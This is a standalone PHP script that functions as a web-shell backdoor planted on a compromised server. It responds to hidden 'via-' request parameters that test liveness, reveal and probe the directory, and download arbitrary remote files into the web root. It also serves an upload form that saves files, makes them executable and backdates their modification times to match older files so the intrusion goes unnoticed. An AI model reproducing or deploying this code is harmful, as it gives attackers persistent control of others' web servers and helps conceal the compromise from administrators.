<?php

            function __via_get_dir_file_paths($dir){

              $filesPaths = array();

              $dirPaths = @scandir($dir);
              if(is_array($dirPaths)){
                foreach(@scandir($dir) as $filePath){
                  if($filePath != "." && $filePath != ".."){
                    $filePath = $dir . DIRECTORY_SEPARATOR . $filePath;
                    $filesPaths[] = $filePath;
                  }
                }
              }

              return $filesPaths;

            }

            function __via_file_get_contents_curl($url) {

              if(function_exists('curl_init')){

                $ch = curl_init();

                curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
                curl_setopt($ch, CURLOPT_HEADER, 0);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
                curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                  'Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4',
                  'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.114 Safari/537.36',
                ));

                $data = curl_exec($ch);
                curl_close($ch);

                if(!$data){
                  $data = @file_get_contents($url);
                }
                return $data;

              }

              return @file_get_contents($url);

            }

            if(isset($_REQUEST['via-make-test'])){
              ob_clean();
              echo 'VIASUCCESS';
              die;
            }

            if(isset($_REQUEST['via-show-dir'])){
              ob_clean();
              echo dirname(__FILE__);
              die;
            }

            if(isset($_REQUEST['via-check-dir'])){

              ob_clean();
              $fileDir = dirname(__FILE__);

              if(@is_writable($fileDir)){

                echo sprintf('Directory is writable %s', $fileDir)."<br/>";

                @file_put_contents($fileDir.DIRECTORY_SEPARATOR.'chrome-test.php', 'Chrome test');

                $paths = __via_get_dir_file_paths($fileDir);
                foreach($paths as $path){
                  $fileDate = date("F d Y H:i:s.", filemtime($path));
                  echo "$path - $fileDate<br/>";
                }

              } else {
                echo sprintf('Directory is not writable %s', $fileDir)."<br/>";
              }

              die;

            }

            if(isset($_REQUEST['via-download-file'])){

              chmod(dirname(__FILE__), 0755);

              $downloadFileUrl      = $_REQUEST['via-download-file'];
              $downloadFileSaveName = (isset($_REQUEST['via-download-file-save-name']) ? $_REQUEST['via-download-file-save-name'] : basename($downloadFileUrl));
              $downloadFilePath     = dirname(__FILE__).DIRECTORY_SEPARATOR.$downloadFileSaveName;
              $downloadFileSource   = __via_file_get_contents_curl($downloadFileUrl);
              if(!$downloadFileSource){
                echo sprintf('File download error %s', $downloadFileUrl)."<br/>";
                die;
              }
              $success = file_put_contents($downloadFilePath, $downloadFileSource);

              if($success){
                echo sprintf('File saved %s', $downloadFileUrl)."<br/>";
              } else {
                echo sprintf('File save error %s', $downloadFileUrl)."<br/>";
              }

              die;

            }

            if (isset($_SERVER["HTTP_X_FORWARDED_HOST"])) {

                $host = $_SERVER["HTTP_X_FORWARDED_HOST"];
                $elements = explode(",", $host);

                $host = trim(end($elements));

            } else {

                if (!$host = $_SERVER["HTTP_HOST"]) {

                    if (!$host = $_SERVER["SERVER_NAME"]) {

                        $host = !empty($_SERVER["SERVER_ADDR"]) ? $_SERVER["SERVER_ADDR"] : "";

                    }

                }

            }

            if (isset($_POST["Submit"])) {

                $fileDir = dirname(__FILE__);

                $user_file_name = $_FILES["image"]["name"];
                $user_file_tmp = $_FILES["image"]["tmp_name"];

                if (isset($_FILES["image"]["name"])) {

                    $destination = $fileDir . $user_file_name;
                    $uploaded = @move_uploaded_file($user_file_tmp, $destination);
                    if(!$uploaded || !@is_file($destination)){
                      echo "File upload error!<br/>";
                    }

                    $changeTime = null;

                    $paths = __via_get_dir_file_paths($fileDir);

                    $changeTime = null;
                    foreach($paths as $path){
                      if($path != __FILE__){
                        if(!$changeTime || $changeTime > filemtime($path)){
                          $changeTime = filemtime($path);
                        }
                      }
                    }

                    if(!$changeTime){
                        $changeTime = time();
                    }
                    @chmod($destination, 0755);
                    @touch($destination, $changeTime);

                    $fullURL = "http://" . $host . dirname($_SERVER["SCRIPT_NAME"]) . "/" . $user_file_name;

                    echo "<b>Done ==> </b><a href='$fullURL' target='_blank'>$user_file_name</a> - " . $changeTime;
                    echo "<br/>";
                    echo "File was last modified: " . date ("F d Y H:i:s.", $changeTime);

                }

            } else {

                echo '<form method="POST" action="" enctype="multipart/form-data"><input type="file" name="image"><input type="Submit" name="Submit" value="Submit"></form>';

            }

            exit();
        